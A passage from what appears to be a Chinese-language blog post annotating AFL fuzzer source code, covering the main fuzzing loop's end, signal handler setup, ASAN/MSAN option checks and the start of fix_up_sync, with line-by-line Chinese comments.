<span class="token function">find_start_position</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从上次中断的地方继续进行模糊测试</span>  <span class="token function">write_stats_file</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更新 fuzzer_stats 文件，记录了 fuzzer 的当前状态</span>  <span class="token function">save_auto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保存 AFL 自动生成的测试用例片段 auto extras</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">goto</span> stop_fuzzing<span class="token punctuation">;</span><span class="token comment">//接收到用户中断指令则停止 fuzz</span>  <span class="token comment">/* Woop woop woop */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>not_on_tty<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//暂停4s让用户看到ui信息</span>    start_time <span class="token operator">+=</span> <span class="token number">4000</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">goto</span> stop_fuzzing<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">//第一轮 fuzz 结束后进行 fuzz 主循环</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    u8 skipped_fuzz<span class="token punctuation">;</span>    <span class="token function">cull_queue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//精简队列</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>queue_cur<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//queue_cur 为空代表所有 queue 被执行了一遍</span>      queue_cycle<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//完整执行次数</span>      current_entry     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//从头开始下一轮 fuzz</span>      cur_skipped_paths <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      queue_cur         <span class="token operator">=</span> queue<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>seek_to<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//检查seek_to是否为空，如果不为空，就从seek_to指定的queue项即从上次中断的地方继续进行模糊测试</span>        current_entry<span class="token operator">++</span><span class="token punctuation">;</span>        seek_to<span class="token operator">--</span><span class="token punctuation">;</span>        queue_cur <span class="token operator">=</span> queue_cur<span class="token operator">-></span>next<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">show_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//刷新ui</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>not_on_tty<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果不是在终端环境下运行</span>        <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Entering queue cycle %llu."</span><span class="token punctuation">,</span> queue_cycle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 输出当前循环周期</span>        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 刷新输出，确保立即显示</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">//源码注释翻译：如果我们有一个完整的队列周期而没有新发现，请接下来尝试重组策略</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>queued_paths <span class="token operator">==</span> prev_queued<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//执行一次完整的扫描之后，新发现的路径数与执行之前的一样，这代表没有发现任何新的路径</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>use_splicing<span class="token punctuation">)</span>             cycles_wo_finds<span class="token operator">++</span><span class="token punctuation">;</span>         <span class="token keyword">else</span>             use_splicing <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 如果使用剪接，则增加无发现循环计数，否则启用剪接</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span>           cycles_wo_finds <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 重置无发现循环计数</span>      prev_queued <span class="token operator">=</span> queued_paths<span class="token punctuation">;</span><span class="token comment">//更新路径</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>sync_id <span class="token operator">&amp;&amp;</span> queue_cycle <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_IMPORT_FIRST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果设置了同步ID，并且是第一次循环，且设置了环境变量AFL_IMPORT_FIRST</span>        <span class="token function">sync_fuzzers</span><span class="token punctuation">(</span>use_argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 同步fuzzer状态</span>    <span class="token punctuation">&#125;</span>    skipped_fuzz <span class="token operator">=</span> <span class="token function">fuzz_one</span><span class="token punctuation">(</span>use_argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 对queue_cur执行一次模糊测试，返回是否跳过</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>stop_soon <span class="token operator">&amp;&amp;</span> sync_id <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skipped_fuzz<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>sync_interval_cnt<span class="token operator">++</span> <span class="token operator">%</span> SYNC_INTERVAL<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">sync_fuzzers</span><span class="token punctuation">(</span>use_argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 如果没有停止信号，有同步ID，没有跳过当前模糊测试，达到同步间隔，就同步fuzzer状态（SYNC_INTERVAL默认为5）</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>stop_soon <span class="token operator">&amp;&amp;</span> exit_1<span class="token punctuation">)</span> stop_soon <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">// 如果设置了单次执行标志，设置即将停止标志</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">// 如果接收到停止信号，退出循环</span>    queue_cur <span class="token operator">=</span> queue_cur<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment">// 移动到队列中的下一个条目</span>    current_entry<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">// 当前条目索引递增</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>queue_cur<span class="token punctuation">)</span> <span class="token function">show_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//当前 queue 不为空，即未全部测试完，则显示当前状态</span>  <span class="token function">write_bitmap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保存当前trace_bits，用于记录目标程序的执行路径覆盖率</span>  <span class="token function">write_stats_file</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更新 AFL 的统计信息文件 fuzzer_stats</span>  <span class="token function">save_auto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保存 AFL 自动生成的测试用例片段 auto extras</span><span class="token comment">//终止fuzz，关闭文件释放资源后退出程序</span>stop_fuzzing<span class="token operator">:</span>  <span class="token function">SAYF</span><span class="token punctuation">(</span>CURSOR_SHOW cLRD <span class="token string">"\n\n+++ Testing aborted %s +++\n"</span> cRST<span class="token punctuation">,</span>       stop_soon <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token string">"programmatically"</span> <span class="token operator">:</span> <span class="token string">"by user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出中断信息</span>  <span class="token comment">/* Running for more than 30 minutes but still doing first cycle? */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>queue_cycle <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get_cur_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time <span class="token operator">></span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//检查是否在第一个周期内中断</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cYEL <span class="token string">"[!] "</span> cRST           <span class="token string">"Stopped during the first cycle, results may be incomplete.\n"</span>           <span class="token string">"    (For info on resuming, see %s/README.)\n"</span><span class="token punctuation">,</span> doc_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//提醒用户测试在第一个周期内被中断，结果可能不完整，并提供了恢复测试的建议</span>  <span class="token punctuation">&#125;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>plot_file<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">destroy_queue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">destroy_extras</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>sync_id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alloc_report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"We're done here. Have a nice day!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* !AFL_LIB */</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h3><p>注册必要的信号处理函数</p><ul><li>SIGHUP，由一个处于非连接状态的终端发送给控制进程，或者由控制进程在自身结束时发送给每个前台进程</li><li>SIGINT，一般由从终端敲入的 Crl+C 组合键或预先设置好的中断字符产生</li><li>SIGTERM，作为一个请求被发送，要求进程结束运行。UNIX在关机时用这个信号要求系统服务停止运行。它是kill命今默认发送的信号</li><li>SIGALRM，由alarm函数设置的定时器产生</li><li>SIGWINCH，处理窗口大小的变化信号</li><li>SIGPIPE，如果在向管道写数据时没有与之对应的读进程，就会产生这个信号</li><li>SIGUSR1，进程之问可以用这个信号进行通信，例如让进程报告状态信息等</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">EXP_ST <span class="token keyword">void</span> <span class="token function">setup_signal_handlers</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> sa<span class="token punctuation">;</span>  sa<span class="token punctuation">.</span>sa_handler   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  sa<span class="token punctuation">.</span>sa_flags     <span class="token operator">=</span> SA_RESTART<span class="token punctuation">;</span>  sa<span class="token punctuation">.</span>sa_sigaction <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sa<span class="token punctuation">.</span>sa_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Various ways of saying "stop". */</span>  sa<span class="token punctuation">.</span>sa_handler <span class="token operator">=</span> handle_stop_sig<span class="token punctuation">;</span>  <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGHUP<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGTERM<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Exec timeout notifications. */</span>  sa<span class="token punctuation">.</span>sa_handler <span class="token operator">=</span> handle_timeout<span class="token punctuation">;</span>  <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGALRM<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Window resize */</span>  sa<span class="token punctuation">.</span>sa_handler <span class="token operator">=</span> handle_resize<span class="token punctuation">;</span>  <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGWINCH<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* SIGUSR1: skip entry */</span>  sa<span class="token punctuation">.</span>sa_handler <span class="token operator">=</span> handle_skipreq<span class="token punctuation">;</span>  <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGUSR1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Things we don't care about. */</span>  sa<span class="token punctuation">.</span>sa_handler <span class="token operator">=</span> SIG_IGN<span class="token punctuation">;</span>  <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGTSTP<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGPIPE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相关信号处理函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Handle stop signal (Ctrl-C, etc). */</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">handle_stop_sig</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  stop_soon <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>child_pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">kill</span><span class="token punctuation">(</span>child_pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>forksrv_pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">kill</span><span class="token punctuation">(</span>forksrv_pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* Handle skip request (SIGUSR1). */</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">handle_skipreq</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  skip_requested <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* Handle timeout (SIGALRM). */</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">handle_timeout</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>child_pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    child_timed_out <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token function">kill</span><span class="token punctuation">(</span>child_pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>child_pid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> forksrv_pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    child_timed_out <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token function">kill</span><span class="token punctuation">(</span>forksrv_pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/* Handle screen resize (SIGWINCH). */</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">handle_resize</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  clear_screen <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h3><p>获取环境变量中的 ASAN_OPTIONS 和 MSAN_OPTIONS，如果选项中不包含要求项则输出报错信息并结束程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">check_asan_opts</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8<span class="token operator">*</span> x <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"ASAN_OPTIONS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token string">"abort_on_error=1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//告诉 ASAN 在检测到错误时应该终止程序，而不是继续执行。</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token string">"symbolize=0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//当 ASAN/MSAN 检测到错误时，会尝试使用符号化的堆栈跟踪来显示错误位置。设置为 0 表示禁用此行为，这通常用于自动化测试或当符号化工具不可用时</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Custom ASAN_OPTIONS set without symbolize=0 - please fix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  x <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"MSAN_OPTIONS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token string">"exit_code="</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span>MSAN_ERROR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//设置 MSAN 在检测到内存错误时应返回的退出代码</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Custom MSAN_OPTIONS set without exit_code="</span>            <span class="token function">STRINGIFY</span><span class="token punctuation">(</span>MSAN_ERROR<span class="token punctuation">)</span> <span class="token string">" - please fix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token string">"symbolize=0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Custom MSAN_OPTIONS set without symbolize=0 - please fix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h3><p>如果通过 -M 或 -S 指定了 sync_id，验证并调整使用 -S 时的 out_dir 和 sync_dir</p><ul><li>指定了 dumb 模式则不能同时使用 -S 或 -M，使用了就报错退出</li><li>遍历 sync_id 限制其只能包含字母数字、下划线或连字符，且长度不大于 32</li><li>更新 out_dir 为 out_dir&#x2F;sync_id，原来的 out_dir 保存在 sync_dir</li><li>如果没有强制确定性模式，则自动跳过确定性变异，并启用拼接策略，增加随机性和覆盖范围</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">fix_up_sync</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8<span class="token operator">*</span> x <span class="token operator">=</span> sync_id<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dumb_mode<span class="token punctuation">)</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"-S / -M and -n are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>skip_deterministic<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//指定跳过确定性变异</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>force_deterministic<span class="token punctuation">)</span><span class="token comment">//强制要求确定性变异</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"use -S instead of -M -d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//提示使用 -S 替代 -M -d，因为 -M 模式首先执行确定性变异而 -d 模式会跳过确定性变异，因此会报错选项冲突</span>    <span class="token keyword">else</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"-S already implies -d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果同时开启 -S 和 -d，提示 -S 包含了 -d</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isalnum</span><span class="token punctuation">(</span><span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>x <span class="token operator">!=</span> <span class="token char">'_'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>x <span class="token operator">!=</span> <span class="token char">'-'</span><span class="token punctuation">)</span><span class="token comment">//遍历 sync_id，存在数字字母、-、_ 以外的字符就报错</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Non-alphanumeric fuzzer ID specified via -S or -M"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>sync_id<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Fuzzer ID too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//限制长度不大于 32</span>  x <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/%s"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> sync_id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将 out_dir 和 sync_id 组合成 out_dir/sync_id 的形式成为新的 out_dir</span>  sync_dir <span class="token operator">=</span> out_dir<span class="token punctuation">;</span><span class="token comment">//sync_dir 设置为原来的 out_dir，同步目录为 out</span>  out_dir  <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token comment">//当前 fuzz 的输出目录为 out/fuzzer1</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>force_deterministic<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果没有强制确定性模式</span>    skip_deterministic <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//自动跳过确定性变异</span>    use_splicing <span class="token operator">=</span> <span class="token number">1</span><span class="token 